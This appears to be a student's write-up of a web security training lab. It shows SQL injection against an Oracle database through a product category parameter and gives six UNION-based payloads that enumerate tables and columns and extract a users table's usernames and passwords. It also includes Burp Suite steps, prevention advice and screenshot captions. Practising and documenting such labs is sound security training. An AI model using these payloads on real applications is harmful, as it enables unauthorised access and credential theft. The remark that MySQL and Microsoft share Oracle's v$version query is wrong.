# 🔐 Lab 6: Listing Database Contents on Oracle

## 🧩 Objective
To retrieve username and password by listing tables and columns contents in the Oracle database and login as administrator.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection in the product category parameter, allowing attackers to
execute arbitrary SQL queries and access database metadata.

## ⚙️ Payload Used
- ' ORDER BY 3--  
- ' UNION SELECT 'a', 'a' FROM DUAL--  
- ' UNION SELECT banner, NULL FROM v$version--
- ' UNION SELECT TABLE_NAME, NULL FROM all_tables--
- ' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_IZLBST'--
- ' UNION SELECT USERNAME_VUAULU, PASSWORD_FTRFNX FROM USERS_IZLBST--

## 🔎 Analysis
1. Determine the number of columns using first payload. 3 - 1 = 2  
2. Determine the data types of the columns using second payload  
3. Both MySQL and Microsoft have same SELECT banner, NUll From v$ersion command 
4. retrieve list of the table name in the database 
5. retrieve the column name of the table 
6. Output the username and password 

## 🚀 Steps to Reproduce
1. Navigate to the product category page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater and modify the parameter using commands.  
4. Send the request and analyze the response  

## ✅ Result
Successfully retrieved database table names, column names, and sensitive user credentials from the Oracle database.

## 🧠 Key Learning
Oracle database use different system tables for metadata. Understanding database-specific structure is essential for successful SQL Injection attacks.
## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement proper input validation
- Appluy least privilege to database accounts 
- Avoid exposing database errors and sensitive data  

---

## 📸 Screenshots

<img width="1349" height="680" alt="LAB6_1" src="https://github.com/user-attachments/assets/0e8109cf-1b92-4764-b144-fd7be602713c" />

**Figure 1:Determining number of columns using ORDER BY payload**

<br><br>
<img width="1357" height="691" alt="LAB6_2" src="https://github.com/user-attachments/assets/772adb87-ba32-4622-ae57-c0478795780b" />

**Figure 2: Finding the database by using UNION payload**

<br><br>
<img width="1357" height="681" alt="LAB6_3" src="https://github.com/user-attachments/assets/252ec641-b88a-44a0-b610-76dabd9015ec" />

**Figure 3: Listing database tables using all_tables**

<br><br>
<img width="1348" height="659" alt="LAB6_4" src="https://github.com/user-attachments/assets/bfe5d1d2-69a7-43f1-b9fd-4ac7422b7fd0" />

**Figure 4:Extracting column names from users table**

<br><br>

<img width="1356" height="679" alt="LAB6_5" src="https://github.com/user-attachments/assets/8beb8820-77e1-4d9d-bf1c-d871991d0c30" />

**Figure 5: Retrieving usernames and passwords from users table**

<br><br>

<img width="1347" height="679" alt="LAB6_6" src="https://github.com/user-attachments/assets/aaeee7d9-8787-4b5f-97f9-3e013bed1602" />

**Figure 6: Successful extraction of sensitive data (Lab Solved)**
